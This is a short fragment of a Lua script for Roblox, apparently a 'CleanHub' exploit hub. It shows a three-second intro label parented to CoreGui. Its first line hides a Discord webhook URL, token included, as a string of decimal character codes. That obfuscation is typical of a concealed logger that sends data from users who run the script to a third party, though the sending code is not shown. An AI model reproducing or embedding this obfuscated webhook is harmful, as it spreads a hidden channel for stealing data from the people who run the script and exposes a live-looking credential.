...
WebhookEncrypted = "104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,53,52,48,50,55,50,55,52,48,56,52,56,55,54,50,56,56,51,47,100,55,54,86,104,76,122,49,75,111,112,99,117,87,89,108,50,114,89,71,82,75,54,117,51,84,88,100,109,49,74,57,102,71,108,105,71,57,57,51,82,79,113,118,54,111,75,85,111,52,45,111,106,122,101,108,48,49,69,87,78,76,104,74,116,107,107,48"
...
task.spawn(function()
    -- Crear la interfaz para la introducción local screenGui = Instance.new("ScreenGui") screenGui.Name = "CleanHubIntro" screenGui.Parent = game:GetService("CoreGui")  -- Crear el texto de fondo/contenedor local textLabel = Instance.new("TextLabel") textLabel.Size = UDim2.new(0, 300, 0, 100) textLabel.Position = UDim2.new(0.5, -150, 0.5, -50) -- Centrado en pantalla textLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20) -- Fondo oscuro textLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- Texto blanco textLabel.Text = "cleanhub" textLabel.TextSize = 36 textLabel.Font = Enum.Font.GothamBold textLabel.Active = true textLabel.Parent = screenGui  -- Añadir bordes redondeados estilizados local uiCorner = Instance.new("UICorner") uiCorner.CornerRadius = UDim.new(0, 12) uiCorner.Parent = textLabel  -- Destruir la introducción automáticamente después de 3 segundos task.wait(3) screenGui:Destroy()
